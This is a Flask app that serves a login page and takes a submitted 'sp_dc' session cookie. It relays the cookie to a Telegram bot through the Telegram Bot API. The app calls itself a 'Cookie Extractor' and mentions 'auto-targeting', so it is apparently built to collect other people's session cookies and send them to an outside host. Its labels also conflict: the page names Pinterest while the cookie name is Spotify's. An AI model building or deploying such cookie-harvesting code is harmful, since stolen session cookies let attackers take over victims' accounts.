# app.py
from flask import Flask, request, jsonify, render_template_string
import requests
from config import TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID

app = Flask(__name__)

with open("login.html", "r") as f:
    LOGIN_HTML = f.read()

@app.route("/login")
def login():
    # Inject your Telegram Chat ID for auto-targeting
    return render_template_string(LOGIN_HTML.replace("{{chat_id}}", ADMIN_CHAT_ID))

@app.route("/sendcookie", methods=["POST"])
def sendcookie():
    data = request.json
    sp_dc = data.get("sp_dc")
    chat_id = data.get("chat_id", ADMIN_CHAT_ID)

    if not sp_dc:
        return jsonify({"error": "Missing sp_dc"}), 400

    # Send cookie to Telegram bot via /setcookie
    msg = f"/setcookie {sp_dc}"
    send_text = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    res = requests.post(send_text, json={"chat_id": chat_id, "text": msg})

    if res.status_code == 200:
        return jsonify({"status": "ok"})
    return jsonify({"error": "Failed to send to Telegram"}), 500

@app.route("/")
def home():
    return "<h3>✅ Pinterest Cookie Extractor Bot Running</h3><p>Go to <a href='/login'>/login</a> to start.</p>"

if __name__ == "__main__":
    app.run(debug=True)
